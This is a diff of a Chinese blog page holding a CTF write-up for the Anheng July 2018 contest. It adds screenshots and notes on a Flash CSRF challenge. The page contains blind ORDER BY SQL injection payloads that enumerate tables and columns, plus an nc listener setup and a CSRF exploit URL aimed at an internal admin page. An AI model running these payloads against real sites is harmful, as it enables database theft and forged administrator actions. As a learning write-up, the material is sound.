@@ -100,12 +100,18 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/07/22/安恒七月月赛wp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="第一次赶上月赛时间">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/65563.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/376786.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/anhengqiyue1.PNG">
-<meta property="og:updated_time" content="2018-07-26T08:40:43.405Z">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/3354543.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/7676786.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/35275.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/7676878flag.PNG">
+<meta property="og:updated_time" content="2018-07-29T14:44:16.934Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="安恒七月月赛wp">
 <meta name="twitter:description" content="第一次赶上月赛时间">
-<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/anhengqiyue1.PNG">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/65563.PNG">
 
 
 
@@ -343,6 +349,8 @@
 <h3 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h3><p>order注入 和之前的盲注语句还是有点区别 </p>
 <p>官方给的值直接sqlmap注的 我当时第一次用sqlmap 结果试了下没出来。。我就手注的</p>
 <p>好吧 后来周赛复现题目时候又试了下sqlmap跑出来了 原来是当时用错了。。</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/65563.PNG" alt=""></p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/376786.PNG" alt=""></p>
 <p>在网上搜到的文章<br><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="external">https://www.cnblogs.com/REscan/p/6884278.html</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">猜解当前数据库的表名：</div><div class="line"></div><div class="line">/?order=(select+1+regexp+<span class="keyword">if</span>(substring((select+concat(table_name)from+information_schema.tables+<span class="built_in">where</span>+table_schema%3ddatabase()+<span class="built_in">limit</span>+0,1),1,1)=0x67,1,0x00)) 正确</div><div class="line">/?order=(select+1+regexp+<span class="keyword">if</span>(substring((select+concat(table_name)from+information_schema.tables+<span class="built_in">where</span>+table_schema%3ddatabase()+<span class="built_in">limit</span>+0,1),1,1)=0x66,1,0x00)) 错误</div><div class="line"></div><div class="line">猜解指定表名中的列名：</div><div class="line"></div><div class="line">/?order=(select+1+regexp+<span class="keyword">if</span>(substring((select+concat(column_name)from+information_schema.columns+<span class="built_in">where</span>+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+<span class="built_in">limit</span>+0,1),1,1)=0x69,1,0x00)) 正常</div><div class="line">/?order=(select+1+regexp+<span class="keyword">if</span>(substring((select+concat(column_name)from+information_schema.columns+<span class="built_in">where</span>+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+<span class="built_in">limit</span>+0,1),1,1)=0x68,1,0x00)) 错误</div></pre></td></tr></table></figure>
 <p>然后注表名 列名 这个有点bug 出来是 flg 好像 猜了下应该是flag才对</p>
@@ -368,9 +376,22 @@
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/anhengqiyue1.PNG" alt=""></p>
 <h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>flash触发csrf 挺难的</p>
 <p>复现这题先搭了下环境 </p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/3354543.PNG" alt=""></p>
 <p>vps上安装httpd开启http服务 然后 tail命令可以查看日志</p>
+<p>tail -f /var/log/httpd/access_log</p>
 <p>哇2.5$的不给ipv4了只能买5$的真的贵 心疼</p>
 <p>文件传输用的 scp命令</p>
+<p>scp C:/Users/Saber/Desktop/exp5.html root@vps:/var/www/html</p>
+<p>又学了下nc监听端口 这里要先让防火墙允许端口的访问</p>
+<p>iptables -I INPUT -p TCP –dport 233 -j ACCEPT</p>
+<p>nc -lvvp 233</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/7676786.PNG" alt=""></p>
+<p>然后这里还有个大坑 windows改的swf文件头是不行的 好像只有mac下才可以 最后用出题人给的改好的swf才打到flag</p>
+<p>payload在readme里有 并不是自己填东西生成的 因为点那个log only不会显示日志 显得是另外一种payload 打不到flag的</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/35275.PNG" alt=""></p>
+<p><a href="http://vps/exp.html?objfile=http://127.0.0.1/upload/1ae8ac510d334c8db91699cbc30b4fe3.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1" target="_blank" rel="external">http://vps/exp.html?objfile=http://127.0.0.1/upload/1ae8ac510d334c8db91699cbc30b4fe3.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1</a></p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/7676878flag.PNG" alt=""></p>
+<p>最后终于打到了flag</p>
 <h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>图片 提示刷新 想到之前做过的f5隐写</p>
 <p>跑下脚本 得一个文件 看文件头是zip 然后伪加密拿flag</p>
 <h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>这题做的歇逼了</p>
@@ -504,7 +525,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
